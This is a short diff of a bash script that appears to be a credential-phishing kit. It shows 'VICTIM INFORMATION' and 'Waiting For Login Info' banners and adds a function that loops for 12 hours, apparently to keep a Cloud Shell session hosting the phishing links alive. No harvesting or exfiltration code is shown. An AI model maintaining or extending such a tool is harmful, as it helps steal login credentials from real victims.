@@ -793,6 +793,7 @@ links_c() {
 			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                            echo ""
 			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Waiting For Login Info, \e[92mCtrl + C \e[1;95mto Exit... \e[93m "
+			   end
 			   echo ""
 }
 
@@ -810,6 +811,7 @@ links_n() {
 			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                            echo ""
 			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Waiting For Login Info, \e[92mCtrl + C \e[1;95mto Exit...\e[93m "
+			   end
 			   echo ""
 }
 
@@ -1051,6 +1053,12 @@ printf "   \b\b\b\b\b"
 tput cnorm
 printf "\e[1;92m [ Done ]\e[0m";
 echo "";
+}
+
+end () {
+echo -----------------------------------------------------------------
+echo "VM can't connect? Restart Cloud Shell then Re-run script."
+seq 1 43200 | while read i; do echo -en "\r Running .     $i s /43200 s";sleep 0.1;echo -en "\r Running ..    $i s /43200 s";sleep 0.1;echo -en "\r Running ...   $i s /43200 s";sleep 0.1;echo -en "\r Running ....  $i s /43200 s";sleep 0.1;echo -en "\r Running ..... $i s /43200 s";sleep 0.1;echo -en "\r Running     . $i s /43200 s";sleep 0.1;echo -en "\r Running  .... $i s /43200 s";sleep 0.1;echo -en "\r Running   ... $i s /43200 s";sleep 0.1;echo -en "\r Running    .. $i s /43200 s";sleep 0.1;echo -en "\r Running     . $i s /43200 s";sleep 0.1; done
 }
 
 check_update1 () {
